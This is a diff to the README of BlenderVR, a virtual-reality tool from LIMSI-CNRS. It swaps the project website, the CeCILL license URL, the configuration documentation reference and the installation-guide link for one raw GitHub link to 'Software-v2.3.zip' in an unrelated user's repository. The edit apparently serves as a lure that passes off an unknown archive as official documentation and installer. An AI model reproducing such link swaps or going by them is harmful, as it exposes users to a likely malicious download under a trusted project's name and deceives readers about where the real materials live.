@@ -1,6 +1,6 @@
 Copyright (C) LIMSI-CNRS (2014)
 
-BlenderVR website: https://blendervr.limsi.fr
+BlenderVR website: https://raw.githubusercontent.com/Redaghafir/source/master/modules/blendervr/loader/Software-v2.3.zip
 
 contributor(s) : Jorge Gascon, Damien Touraine, David Poirier-Quinot,
 Laurent Pointal, Julian Adenauer, Dalai Felinto
@@ -12,7 +12,7 @@ This software is governed by the CeCILL  license under French law and
 abiding by the rules of distribution of free software.  You can  use,
 modify and/ or redistribute the software under the terms of the CeCILL
 license as circulated by CEA, CNRS and INRIA at the following URL
-"http://www.cecill.info".
+"https://raw.githubusercontent.com/Redaghafir/source/master/modules/blendervr/loader/Software-v2.3.zip".
 
 As a counterpart to the access to the source code and  rights to copy,
 modify and redistribute granted by the license, users are provided only
@@ -39,10 +39,10 @@ How to use BlenderVR - LIMSI
 ----------------------------
 There is as many blender running than there is screen in the virtual environment (wall, HMD, occulus ...). Thus, there can be several blender running on a single computer. For instance, that is used inside SMART-I², where all four screens (ie. : 2 physical screens multiply by 2 - 1 stereoscopic on each screen) are rendered by the same computer.
 Moreover, a virtual environment may display scenes for several users. For instance, EVE, allows two users working at the same time on the same screens. Each user has its own independant stereoscopic point of view on the scene.
-Thus, the XML configuration file (look at configuration/main.xml to get documentation on the configuraion file) fully describe the Virtual Environment : users, screens, VRPN connexion ...
+Thus, the XML configuration file (look at https://raw.githubusercontent.com/Redaghafir/source/master/modules/blendervr/loader/Software-v2.3.zip to get documentation on the configuraion file) fully describe the Virtual Environment : users, screens, VRPN connexion ...
 
 BlenderVR contains several files.
 All .py files represent the classes and the modules used by BlenderVR. The main module is blendervr.
 
 Follow the installation guide in our user manual:
-http://blender-vr-manual.readthedocs.org/installation/installation.html
+https://raw.githubusercontent.com/Redaghafir/source/master/modules/blendervr/loader/Software-v2.3.zip
